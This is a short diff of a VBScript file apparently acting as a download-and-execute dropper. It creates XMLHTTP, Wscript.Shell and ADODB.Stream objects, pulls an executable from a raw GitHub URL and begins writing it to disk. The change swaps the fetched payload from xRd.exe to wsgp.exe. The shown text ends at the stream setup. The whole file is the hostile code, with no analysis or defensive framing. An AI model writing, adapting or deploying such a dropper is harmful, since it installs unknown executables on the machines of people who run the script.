@@ -1,6 +1,6 @@
 Set Post=CreateObject("Msxml2.XMLHTTP") 
 Set Shell=CreateObject("Wscript.Shell") 
-Post.Open "GET","https://raw.githubusercontent.com/KillTimeSummer/clopro/master/xRd.exe",0 
+Post.Open "GET","https://raw.githubusercontent.com/KillTimeSummer/clopro/master/wsgp.exe",0 
 Post.Send() 
 Set aGet=CreateObject("ADODB.Stream") 
 aGet.Mode=3 
